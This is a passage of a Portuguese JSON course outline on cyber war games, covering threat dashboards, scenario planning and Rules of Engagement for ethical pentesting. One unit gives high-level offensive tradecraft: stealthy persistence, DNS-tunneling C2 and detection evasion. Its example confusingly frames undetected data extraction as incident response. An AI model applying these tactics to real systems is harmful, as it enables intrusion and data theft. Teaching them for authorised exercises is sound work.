                                    "Personalizar visualizações para representar estados de ameaça (ex: heatmaps de ataques)",
                                    "Testar responsividade do dashboard com dados simulados"
                                  ],
                                  "verification": "Executar o dashboard e capturar screenshot de um painel funcional com dados mock",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Computador com Python ou acesso a nuvem (AWS/GCP)",
                                    "Tutoriais oficiais de Grafana/Kibana",
                                    "Dados de teste de ferramentas como ELK Stack"
                                  ],
                                  "tips": "Comece com templates prontos para acelerar a configuração inicial",
                                  "learningObjective": "Configurar dashboards personalizados otimizados para visualização dinâmica de situações cibernéticas",
                                  "commonMistakes": [
                                    "Escolher ferramentas sem suporte a tempo real",
                                    "Sobrecarregar o dashboard com métricas irrelevantes",
                                    "Não testar em diferentes resoluções de tela"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar e Automatizar Fontes de Dados em Tempo Real",
                                  "subSteps": [
                                    "Identificar fontes de dados relevantes: logs SIEM, sensores de rede, feeds de threat intel",
                                    "Configurar pipelines de ingestão de dados usando ferramentas como Apache Kafka ou Fluentd",
                                    "Implementar scripts de automação para atualização contínua (ex: Python com WebSockets)",
                                    "Adicionar regras de filtragem e agregação para reduzir ruído",
                                    "Simular fluxos de dados em tempo real e monitorar latência"
                                  ],
                                  "verification": "Injetar dados simulados e confirmar atualização no dashboard em <10 segundos",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Ferramentas de simulação como Wireshark ou Splunk Free",
                                    "Bibliotecas Python: Dash, Plotly, Pandas",
                                    "Conta gratuita em serviços de threat intel como AlienVault OTX"
                                  ],
                                  "tips": "Use webhooks para integrações rápidas com fontes externas",
                                  "learningObjective": "Estabelecer fluxos de dados em tempo real que alimentem o modelo situacional dinâmico",
                                  "commonMistakes": [
                                    "Não tratar falhas de conectividade",
                                    "Ignorar escalabilidade para volumes altos de dados",
                                    "Deixar dados não validados entrarem no modelo"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Atualizações Contínuas e Decisões Rápidas em Simulações",
                                  "subSteps": [
                                    "Executar simulações de jogos de guerra cibernética usando ferramentas como Cyber Range",
                                    "Atualizar o modelo manual e automaticamente em resposta a eventos simulados",
                                    "Treinar tomada de decisões baseadas no dashboard: priorizar ameaças, alocar recursos",
                                    "Analisar logs de atualizações para otimizar o modelo",
                                    "Realizar iterações com feedback para refinar o dashboard"
                                  ],
                                  "verification": "Gravar uma sessão de simulação mostrando 3 atualizações bem-sucedidas e decisões tomadas",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Plataformas de simulação: Atomic Red Team, CyberBattleSim",
                                    "Ambiente virtualizado com VMs para ataques simulados"
                                  ],
                                  "tips": "Cronometre decisões para simular pressão real de operações cibernéticas",
                                  "learningObjective": "Aplicar o modelo dinâmico em cenários reais de jogos de guerra para decisões ágeis",
                                  "commonMistakes": [
                                    "Atualizar o modelo sem validar novas informações",
                                    "Demorar mais de 1 minuto por decisão crítica",
                                    "Não documentar lições aprendidas das simulações"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulado, configure um dashboard Grafana integrado a logs de rede via ELK Stack. Ao detectar um pico de tráfego DDoS, o modelo atualiza automaticamente o heatmap de ameaças, permitindo decidir em 30 segundos o bloqueio de IPs suspeitos e realocação de defesas.",
                              "finalVerifications": [
                                "Dashboard atualiza com novos dados em menos de 30 segundos",
                                "Modelo reflete corretamente pelo menos 95% das mudanças simuladas",
                                "Usuário toma decisões válidas em <1 minuto por evento",
                                "Nenhum alerta falso positivo em 10 simulações",
                                "Logs de atualização mostram automação funcional",
                                "Dashboard permanece estável sob carga alta de dados"
                              ],
                              "assessmentCriteria": [
                                "Precisão das atualizações do modelo (90%+ acurácia)",
                                "Latência de resposta do dashboard (<30s)",
                                "Efetividade das decisões em simulações (sucesso em 80%+ dos cenários)",
                                "Qualidade da visualização (clareza e usabilidade)",
                                "Robustez contra falhas de dados (recuperação automática)",
                                "Documentação de otimizações realizadas"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Análise estatística e machine learning para detecção de anomalias",
                                "Programação: Desenvolvimento de APIs e scripts de automação em Python/JavaScript",
                                "Gestão de Projetos: Planejamento de pipelines de dados em tempo real",
                                "Estatística: Processamento de séries temporais e previsão de ameaças",
                                "Psicologia: Gerenciamento de estresse em tomadas de decisão sob pressão"
                              ],
                              "realWorldApplication": "Em Centros de Operações de Segurança (SOC) de empresas e governos, profissionais mantêm dashboards dinâmicos para monitorar ataques cibernéticos em tempo real, permitindo respostas rápidas a incidentes como ransomware ou APTs, minimizando danos e downtime."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.3.3",
                            "name": "Integração com Planejamento de Cenários",
                            "description": "Incorporar insights de consciência situacional ao planejamento de cenários de ameaça, ajustando táticas de persistência e comando & controle conforme o contexto real.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar Consciência Situacional Atual",
                                  "subSteps": [
                                    "Colete dados em tempo real de sensores, logs e inteligência sobre o ambiente cibernético.",
                                    "Identifique elementos chave: ativos críticos, vetores de ameaça ativos e comportamentos anômalos.",
                                    "Classifique o nível de ameaça usando frameworks como MITRE ATT&CK.",
                                    "Documente insights acionáveis em um relatório situacional conciso.",
                                    "Priorize insights relevantes para cenários de ameaça iminentes."
                                  ],
                                  "verification": "Relatório situacional completo com pelo menos 5 insights validados por fontes múltiplas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de monitoramento (SIEM como Splunk ou ELK Stack)",
                                    "Templates de relatório situacional",
                                    "Acesso a logs e feeds de inteligência"
                                  ],
                                  "tips": "Foquem em dados frescos (últimas 24h) para relevância máxima.",
                                  "learningObjective": "Desenvolver habilidade em sintetizar dados situacionais para informar planejamento.",
                                  "commonMistakes": [
                                    "Ignorar dados contraditórios",
                                    "Sobrecarregar o relatório com irrelevâncias"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Cenários de Ameaça Baseados em Insights",
                                  "subSteps": [
                                    "Liste 3-5 cenários plausíveis derivados dos insights situacionais.",
                                    "Para cada cenário, defina triggers, impactos potenciais e probabilidades.",
                                    "Incorpore variáveis dinâmicas como mudanças no tráfego de rede ou novas vulnerabilidades.",
                                    "Crie um diagrama de árvore de decisão para ramificações de cenários.",
                                    "Valide cenários com histórico de ataques semelhantes."
                                  ],
                                  "verification": "Diagrama de cenários com probabilidades atribuídas e pelo menos 3 ramificações por cenário principal.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramentas de modelagem (Draw.io ou Lucidchart)",
                                    "Banco de dados MITRE ATT&CK",
                                    "Histórico de incidentes"
                                  ],
                                  "tips": "Use probabilidades bayesianas simples para quantificar riscos.",
                                  "learningObjective": "Mapear cenários de ameaça dinâmicos a partir de consciência situacional.",
                                  "commonMistakes": [
                                    "Cenários muito genéricos sem ligação direta aos insights",
                                    "Subestimar cenários de cauda longa"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Ajustar Táticas de Persistência e Comando & Controle",
                                  "subSteps": [
                                    "Analise táticas atuais de persistência (ex: backdoors, scheduled tasks) contra o contexto atual.",
                                    "Adapte C2 channels (ex: mudar de HTTP para DNS tunneling se detectado).",
                                    "Integre adaptações aos cenários mapeados, criando planos condicionais.",
                                    "Teste compatibilidade das táticas ajustadas com defesas adversárias esperadas.",
                                    "Otimize para stealth e resiliência baseada em insights situacionais."
                                  ],
                                  "verification": "Plano de táticas ajustadas documentado com mapeamento para cada cenário.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Framework MITRE ATT&CK Navigator",
                                    "Simuladores de C2 (Cobalt Strike ou Empire)",
                                    "Documentos de táticas existentes"
                                  ],
                                  "tips": "Priorize táticas com baixa detecção comprovada no contexto atual.",
                                  "learningObjective": "Ajustar dinamicamente táticas ofensivas conforme evolução situacional.",
                                  "commonMistakes": [
                                    "Manter táticas obsoletas apesar de insights",
                                    "Ajustes que comprometem a persistência"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular, Validar e Documentar o Plano Integrado",
                                  "subSteps": [
                                    "Execute simulação tabletop ou em ambiente controlado para cada cenário ajustado.",
                                    "Meça eficácia das adaptações usando métricas como tempo de detecção e sucesso de C2.",
                                    "Registre lições aprendidas e ajustes finais.",
                                    "Crie um playbook executável com triggers automatizados.",
                                    "Compartilhe o plano com stakeholders para feedback."
                                  ],
                                  "verification": "Relatório de simulação com métricas de sucesso (>80% em cenários testados) e playbook finalizado.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ambiente de simulação (Cyber Range ou VMWare)",
                                    "Ferramentas de replay de ataques",
                                    "Templates de playbook"
                                  ],
                                  "tips": "Grave sessões de simulação para análise posterior.",
                                  "learningObjective": "Validar integração de consciência situacional em planos operacionais.",
                                  "commonMistakes": [
                                    "Simulações superficiais sem métricas",
                                    "Falta de documentação acionável"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de ataque a uma rede bancária, insights situacionais revelam monitoramento avançado de tráfego HTTP. O plano ajusta C2 para DNS tunneling, persistência via WMI subscriptions, permitindo continuidade em cenários de quarentena parcial.",
                              "finalVerifications": [
                                "Todos os cenários mapeados incorporam pelo menos 3 insights situacionais específicos.",
                                "Táticas ajustadas demonstram >20% melhoria em métricas de stealth em simulações.",
                                "Plano inclui triggers automáticos para adaptação em tempo real.",
                                "Documentação cobre 100% das ramificações de cenários.",
                                "Feedback de stakeholders confirma viabilidade operacional.",
                                "Ausência de táticas conflitantes com defesas conhecidas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na integração de insights situacionais (90% alinhamento).",
                                "Completude dos ajustes táticos (todas táticas cobertas).",
                                "Realismo e viabilidade das adaptações (baseado em TTPs comprovadas).",
                                "Eficiência temporal (plano executável em <5 minutos por trigger).",
                                "Criatividade em conexões interdisciplinares.",
                                "Qualidade da documentação e simulações."
                              ],
                              "crossCurricularConnections": [
                                "Estratégia Militar: Planejamento OODA Loop para adaptação rápida.",
                                "Análise de Riscos: Modelos probabilísticos de cenários (Monte Carlo).",
                                "Inteligência Artificial: Uso de ML para previsão situacional.",
                                "Gestão de Incidentes: Frameworks NIST para resposta adaptativa."
                              ],
                              "realWorldApplication": "Durante uma operação de resposta a incidentes em uma infraestrutura crítica, como energia, onde consciência situacional detecta um APT pivotando via IoT; o plano ajustado mantém persistência via living-off-the-land e redireciona C2 para evitar honeypots, permitindo extração de dados sem detecção."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.4",
                    "name": "Regras de Engajamento",
                    "description": "Diretrizes e limites para operações de testes de penetração éticos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.4.1",
                        "name": "Definição e Propósito das Regras de Engajamento",
                        "description": "Compreensão fundamental do que são as Regras de Engajamento (ROE) e sua relevância em operações de testes de penetração éticos, garantindo que as ações sejam legais, controladas e alinhadas com objetivos organizacionais.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.1.1",
                            "name": "Definir Regras de Engajamento",
                            "description": "Explicar o conceito de ROE como conjunto de diretrizes que delimitam o escopo, métodos e limites das operações cibernéticas ofensivas, diferenciando-as de regulamentações legais gerais, com base em referências como o livro 'Red Team Development and Operations'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Básico de Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Ler a definição de ROE no livro 'Red Team Development and Operations' (capítulo relevante sobre operações ofensivas).",
                                    "Identificar ROE como diretrizes que definem escopo, métodos e limites de operações cibernéticas ofensivas.",
                                    "Anotar exemplos iniciais de ROE em contextos militares tradicionais adaptados para ciberespaço.",
                                    "Resumir em 3-5 frases o propósito principal das ROE em cenários de Red Team.",
                                    "Discutir com um colega ou mentor o que diferencia ROE de ordens operacionais gerais."
                                  ],
                                  "verification": "Criar um resumo de 200 palavras explicando ROE e compartilhar para revisão.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Livro 'Red Team Development and Operations' (PDF ou físico)",
                                    "Notebook para anotações",
                                    "Acesso a glossário de termos cibernéticos"
                                  ],
                                  "tips": "Foque em analogias militares para facilitar a compreensão inicial.",
                                  "learningObjective": "Dominar a definição fundamental de ROE e seu papel em operações cibernéticas.",
                                  "commonMistakes": [
                                    "Confundir ROE com leis gerais",
                                    "Ignorar o contexto ofensivo específico",
                                    "Não consultar fontes primárias como o livro referenciado"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar ROE de Regulamentações Legais e Normas Gerais",
                                  "subSteps": [
                                    "Listar 5 regulamentações legais comuns em cibersegurança (ex: GDPR, CFAA, leis de guerra cibernética).",
                                    "Comparar em uma tabela: ROE vs. Leis (escopo, aplicabilidade, flexibilidade, enforcement).",
                                    "Analisar casos onde ROE se sobrepõem mas não substituem leis (ex: autorização para testes de penetração).",
                                    "Estudar exemplos do livro onde ROE são ajustadas por requisitos legais.",
                                    "Escrever um parágrafo explicando por que ROE são específicas para operações ofensivas."
                                  ],
                                  "verification": "Produzir uma tabela comparativa revisada por um par ou autoavaliação.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Tabela comparativa em Excel/Google Sheets",
                                    "Referências legais online (ex: NIST, DoD directives)",
                                    "Livro 'Red Team Development and Operations'"
                                  ],
                                  "tips": "Use cores na tabela para destacar diferenças chave (ex: verde para ROE flexível, vermelho para leis rígidas).",
                                  "learningObjective": "Distinguir claramente ROE de frameworks legais para evitar confusões operacionais.",
                                  "commonMistakes": [
                                    "Equiparar ROE a compliance legal",
                                    "Subestimar a necessidade de aprovação legal para ROE",
                                    "Não considerar jurisdições internacionais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Componentes Chave das ROE em Operações Cibernéticas",
                                  "subSteps": [
                                    "Extrair do livro os componentes essenciais: escopo geográfico, alvos permitidos, métodos autorizados, limites de escalada.",
                                    "Mapear cada componente para um cenário cibernético ofensivo (ex: DDoS vs. persistência).",
                                    "Criar um template de ROE com placeholders para cada componente.",
                                    "Revisar exemplos reais anonimizados de ROE em relatórios de Red Team.",
                                    "Simular uma discussão de aprovação de ROE com regras definidas."
                                  ],
                                  "verification": "Preencher o template com um exemplo hipotético e validar contra critérios do livro.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Template de ROE em documento editável",
                                    "Exemplos de ROE de fontes públicas (ex: Tallinn Manual)",
                                    "Livro referenciado"
                                  ],
                                  "tips": "Priorize componentes que previnem escalada descontrolada em ciberops.",
                                  "learningObjective": "Listar e explicar os componentes estruturais de um conjunto de ROE eficaz.",
                                  "commonMistakes": [
                                    "Omitir limites de escalada",
                                    "Definir escopo muito amplo",
                                    "Ignorar métricas de sucesso/falha"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e Testar Definição de ROE em um Cenário Prático",
                                  "subSteps": [
                                    "Escolher um cenário de Red Team simples (ex: simulação de ataque a rede corporativa simulada).",
                                    "Redigir um conjunto completo de ROE baseado nos passos anteriores.",
                                    "Simular execução: identificar violações potenciais e ajustes necessários.",
                                    "Avaliar o ROE contra princípios do livro e refinar.",
                                    "Documentar lições aprendidas em um relatório curto."
                                  ],
                                  "verification": "Apresentar o ROE simulado e relatório para feedback externo.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Ferramenta de simulação como Cyber Range ou diagrama em Draw.io",
                                    "Checklist de componentes de ROE",
                                    "Livro para validação"
                                  ],
                                  "tips": "Teste o ROE com 'what-if' cenários para robustez.",
                                  "learningObjective": "Sintetizar conhecimento para criar ROE acionáveis em contextos reais.",
                                  "commonMistakes": [
                                    "ROE muito vagas ou rígidas",
                                    "Não alinhar com objetivos da missão",
                                    "Esquecer de incluir cláusulas de abort"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de Red Team para testar defesas de uma empresa fictícia, defina ROE que permitam varredura de portas (escopo: portas 80/443), proíbam exploits zero-day sem aprovação, limitem duração a 48h e exijam relatório diário, diferenciando de leis como proibição de acesso não autorizado sem consentimento contratual.",
                              "finalVerifications": [
                                "Explicar ROE em 1 minuto sem consultar notas.",
                                "Diferenciar corretamente ROE de 3 leis cibernéticas específicas.",
                                "Listar 5 componentes chave de ROE de memória.",
                                "Criar um ROE básico para um cenário dado em <10 minutos.",
                                "Identificar violações em um ROE hipotético defeituoso.",
                                "Referenciar corretamente o livro em explicações."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de ROE (90% alinhado com referências).",
                                "Clareza na diferenciação de leis e regulamentações.",
                                "Completude dos componentes chave no template criado.",
                                "Relevância e praticidade no exemplo aplicado.",
                                "Profundidade nas verificações e erros comuns evitados.",
                                "Capacidade de síntese em cenários simulados."
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional: Tallinn Manual sobre guerra cibernética.",
                                "Ética Profissional: Códigos de conduta em pentesting (CREST, OSCP).",
                                "Estratégia Militar: Doutrinas DoD sobre ROE adaptadas a ciber.",
                                "Gestão de Projetos: Definição de escopo em PMBOK para ops limitadas.",
                                "Análise de Riscos: NIST SP 800-30 para limites operacionais."
                              ],
                              "realWorldApplication": "Em operações de Red Team autorizadas por empresas ou governos, ROE garantem que testes ofensivos permaneçam dentro de limites éticos e legais, prevenindo danos colaterais como em incidentes reais de purple teaming onde ROE mal definidas levaram a interrupções não planejadas de serviços críticos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.1.2",
                            "name": "Identificar o Propósito das ROE",
                            "description": "Analisar como as ROE protegem ativos críticos, minimizam riscos de danos colaterais e asseguram conformidade ética, ilustrando com exemplos de jogos de guerra cibernética onde violações poderiam comprometer a credibilidade da Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Definição e Contexto das ROE em Operações Cibernéticas",
                                  "subSteps": [
                                    "Ler a definição oficial de Regras de Engajamento (ROE) em documentos militares e cibernéticos.",
                                    "Identificar diferenças entre ROE em operações físicas e cibernéticas.",
                                    "Analisar o papel das ROE em jogos de guerra cibernética como limites operacionais.",
                                    "Mapear o contexto hierárquico: de leis internacionais a ROE específicas da missão.",
                                    "Discutir com um parceiro ou em fórum o porquê de ROE serem dinâmicas."
                                  ],
                                  "verification": "Escrever um parágrafo resumindo a definição e contexto das ROE, citando pelo menos duas fontes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documento NIST sobre ROE cibernéticas",
                                    "Vídeo introdutório de 5 minutos sobre ROE militares",
                                    "Artigo sobre jogos de guerra cibernética"
                                  ],
                                  "tips": "Use analogias militares tradicionais para facilitar a compreensão do contexto cibernético.",
                                  "learningObjective": "Dominar a definição e o escopo contextual das ROE em segurança cibernética.",
                                  "commonMistakes": [
                                    "Confundir ROE com regulamentações gerais de TI, ignorando o aspecto operacional dinâmico."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a Proteção de Ativos Críticos pelas ROE",
                                  "subSteps": [
                                    "Listar ativos críticos em cenários cibernéticos (ex.: servidores governamentais, redes aliadas).",
                                    "Examinar cláusulas de ROE que proíbem ataques a esses ativos.",
                                    "Simular um cenário onde ROE protegem ativos durante um exercício de Red Team.",
                                    "Avaliar impactos de violações em ativos críticos.",
                                    "Documentar exemplos reais ou hipotéticos de proteção bem-sucedida."
                                  ],
                                  "verification": "Criar uma tabela com 3 ativos críticos e como ROE os protegem.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Guia de ativos críticos do framework MITRE ATT&CK",
                                    "Template de tabela em Excel ou Google Sheets",
                                    "Casos de estudo de exercícios cibernéticos"
                                  ],
                                  "tips": "Priorize ativos de alto valor como C2 (Command and Control) para relevância.",
                                  "learningObjective": "Identificar mecanismos específicos de ROE para salvaguarda de ativos críticos.",
                                  "commonMistakes": [
                                    "Subestimar ativos 'não óbvios' como backups ou comunicações internas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Minimização de Riscos de Danos Colaterais",
                                  "subSteps": [
                                    "Definir danos colaterais em contextos cibernéticos (ex.: impacto em civis ou infraestruturas não-alvo).",
                                    "Revisar ROE que impõem restrições geográficas ou temporais em ataques simulados.",
                                    "Analisar cenários de jogos de guerra onde danos colaterais são minimizados por ROE.",
                                    "Calcular riscos potenciais sem ROE vs. com ROE em um caso hipotético.",
                                    "Debater trade-offs entre efetividade da Red Team e minimização de riscos."
                                  ],
                                  "verification": "Desenhar um fluxograma mostrando fluxo de decisão para evitar danos colaterais sob ROE.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta de fluxograma como Lucidchart ou Draw.io",
                                    "Relatórios de incidentes cibernéticos com danos colaterais",
                                    "Exemplos de ROE de exercícios como Cyber Flag"
                                  ],
                                  "tips": "Considere efeitos em cadeia, como um ataque propagando para redes civis.",
                                  "learningObjective": "Compreender como ROE reduzem riscos de danos colaterais em simulações.",
                                  "commonMistakes": [
                                    "Ignorar danos indiretos, focando apenas em alvos diretos."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Conformidade Ética e Exemplos de Violações",
                                  "subSteps": [
                                    "Estudar princípios éticos em operações cibernéticas (ex.: proporcionalidade, distinção).",
                                    "Revisar ROE que asseguram alinhamento ético e legal.",
                                    "Analisar casos de jogos de guerra onde violações de ROE comprometeram credibilidade da Red Team.",
                                    "Criar narrativa de um cenário de violação e suas consequências.",
                                    "Propor melhorias em ROE para reforçar ética futura."
                                  ],
                                  "verification": "Redigir um relatório de 200 palavras sobre um exemplo de violação e lições aprendidas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Código de Ética da (ISC)² ou similar",
                                    "Casos de estudo de falhas em Red Team (anonimizados)",
                                    "Template de relatório"
                                  ],
                                  "tips": "Ligue ética a credibilidade: uma violação pode invalidar todo o exercício.",
                                  "learningObjective": "Reconhecer o papel das ROE na garantia de conformidade ética e impactos de violações.",
                                  "commonMistakes": [
                                    "Separar ética de aspectos operacionais, tratando como 'add-on'."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulando um ataque a uma rede inimiga, as ROE proíbem o uso de malware que poderia se espalhar para servidores civis conectados. A Red Team identifica um vetor de ataque, mas verifica as ROE para confirmar que não afeta ativos críticos como hospitais virtuais, minimizando danos colaterais e mantendo conformidade ética; uma violação simulada resultaria em desqualificação da equipe e perda de credibilidade.",
                              "finalVerifications": [
                                "Explicar verbalmente os três propósitos principais das ROE com exemplos cibernéticos.",
                                "Identificar em um cenário hipotético uma violação de ROE e suas consequências.",
                                "Listar 5 cláusulas de ROE protetoras de ativos críticos.",
                                "Demonstrar como ROE minimizam danos colaterais em um fluxograma simples.",
                                "Discutir impacto ético de violações em credibilidade da Red Team.",
                                "Resumir diferenças entre ROE e leis em 3 pontos chave."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação dos propósitos das ROE (proteção, minimização de riscos, ética).",
                                "Profundidade de análise com exemplos concretos de jogos de guerra cibernética.",
                                "Completude dos steps com subSteps acionáveis e verificações.",
                                "Relevância das conexões a ativos críticos e danos colaterais.",
                                "Clareza na ilustração de violações e impactos na credibilidade.",
                                "Uso adequado de materiais e tips para aprendizado autônomo."
                              ],
                              "crossCurricularConnections": [
                                "Ética em Tecnologia da Informação: Princípios de proporcionalidade e distinção.",
                                "Direito Internacional Humanitário: Aplicação a conflitos cibernéticos.",
                                "Gestão de Riscos e Compliance: Frameworks como NIST e ISO 27001.",
                                "Estratégia Militar: Paralelos com ROE em operações kineticas.",
                                "Psicologia Organizacional: Impacto de violações na confiança da equipe."
                              ],
                              "realWorldApplication": "Nas operações reais de Red Team em agências governamentais como NSA ou equivalentes, as ROE garantem que testes de penetração não comprometam infraestruturas críticas nacionais, evitem vazamentos para o setor privado e preservem a reputação ética da equipe, como visto em exercícios como Locked Shields da NATO, onde violações levam a sanções operacionais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.1.3",
                            "name": "Diferenciar ROE de Leis e Regulamentações",
                            "description": "Comparar ROE com leis como LGPD e GDPR, destacando que ROE são acordos contratuais específicos para testes éticos, evitando confusões em cenários de operações autorizadas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Leis e Regulamentações Cibernéticas",
                                  "subSteps": [
                                    "Pesquisar a definição e escopo da LGPD (Lei Geral de Proteção de Dados).",
                                    "Analisar os princípios fundamentais da GDPR (Regulamento Geral de Proteção de Dados da UE).",
                                    "Identificar sanções por violações dessas leis.",
                                    "Listar exemplos de aplicação em contextos cibernéticos.",
                                    "Comparar similaridades entre LGPD e GDPR."
                                  ],
                                  "verification": "Criar um resumo de 1 página com definições e exemplos das leis.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Textos oficiais da LGPD e GDPR",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Foque nos aspectos de proteção de dados e obrigações legais universais.",
                                  "learningObjective": "Entender o caráter obrigatório e universal das leis cibernéticas.",
                                  "commonMistakes": [
                                    "Confundir leis com diretrizes voluntárias",
                                    "Ignorar diferenças regionais entre LGPD e GDPR"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender o Conceito e Propósito das Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Definir ROE como acordos contratuais específicos para operações éticas.",
                                    "Explorar o propósito: delimitar ações autorizadas em testes cibernéticos.",
                                    "Identificar componentes típicos de um documento ROE (ex: alvos permitidos, métodos).",
                                    "Analisar como ROE são negociadas entre partes envolvidas.",
                                    "Diferenciar ROE de outros acordos como NDAs."
                                  ],
                                  "verification": "Esboçar um exemplo simplificado de ROE para um teste hipotético.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentos modelo de ROE",
                                    "Artigos sobre jogos de guerra cibernéticos",
                                    "Ferramentas de edição de texto"
                                  ],
                                  "tips": "Lembre-se que ROE são específicas e temporárias, não permanentes como leis.",
                                  "learningObjective": "Reconhecer ROE como ferramentas contratuais para cenários controlados.",
                                  "commonMistakes": [
                                    "Achar que ROE substituem leis",
                                    "Confundir ROE com políticas internas de empresa"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Diferenças Chave entre ROE e Leis",
                                  "subSteps": [
                                    "Criar uma tabela comparativa: obrigatoriedade (leis: universal; ROE: contratual).",
                                    "Comparar escopo: leis amplas vs. ROE específicas para operações.",
                                    "Analisar hierarquia: leis prevalecem sobre ROE em conflitos.",
                                    "Destacar que ROE complementam leis em testes autorizados.",
                                    "Listar cenários onde confusão pode ocorrer."
                                  ],
                                  "verification": "Preencher e validar uma tabela de comparação com pelo menos 5 diferenças.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha ou tabela em editor de texto",
                                    "Resumos dos steps anteriores"
                                  ],
                                  "tips": "Use cores na tabela para destacar diferenças (vermelho para leis, azul para ROE).",
                                  "learningObjective": "Dominar as distinções fundamentais para evitar violações.",
                                  "commonMistakes": [
                                    "Ignorar que ROE não isentam de leis",
                                    "Superestimar flexibilidade das ROE"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar o Conhecimento em Cenários de Operações Autorizadas",
                                  "subSteps": [
                                    "Analisar um cenário: pentest com ROE vs. incidente real sob LGPD.",
                                    "Simular decisão: ação permitida por ROE mas proibida por lei?",
                                    "Discutir como resolver conflitos entre ROE e regulamentações.",
                                    "Criar um checklist para validação pré-operação.",
                                    "Avaliar impacto ético de confusões."
                                  ],
                                  "verification": "Produzir um relatório curto de análise de 2 cenários.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Cenários hipotéticos impressos ou digitais",
                                    "Checklist template"
                                  ],
                                  "tips": "Sempre priorize leis; ROE são autorizações adicionais.",
                                  "learningObjective": "Aplicar diferenciação em contextos reais de segurança cibernética.",
                                  "commonMistakes": [
                                    "Aplicar ROE em operações não autorizadas",
                                    "Desconsiderar evolução legal"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético contratado por uma empresa brasileira, as ROE autorizam scans de vulnerabilidades apenas em servidores de teste (IPs específicos), enquanto a LGPD exige consentimento explícito para qualquer tratamento de dados pessoais encontrados, independentemente do contrato.",
                              "finalVerifications": [
                                "Explicar verbalmente 3 diferenças principais entre ROE e LGPD/GDPR.",
                                "Identificar corretamente em um cenário se uma ação viola lei ou apenas ROE.",
                                "Montar uma tabela comparativa precisa sem erros.",
                                "Listar sanções de leis vs. consequências contratuais de ROE.",
                                "Aplicar checklist em um caso hipotético sem falhas.",
                                "Discutir hierarquia: leis > ROE."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições e comparações (90% acerto).",
                                "Profundidade na análise de cenários práticos.",
                                "Completude da tabela comparativa (mínimo 5 itens).",
                                "Clareza na identificação de erros comuns e soluções.",
                                "Demonstração de aplicação ética em contextos reais.",
                                "Uso correto de terminologia técnica."
                              ],
                              "crossCurricularConnections": [
                                "Direito Digital: Estudo de legislações como LGPD.",
                                "Ética Profissional: Decisões morais em testes cibernéticos.",
                                "Gestão de Contratos: Negociação de ROE.",
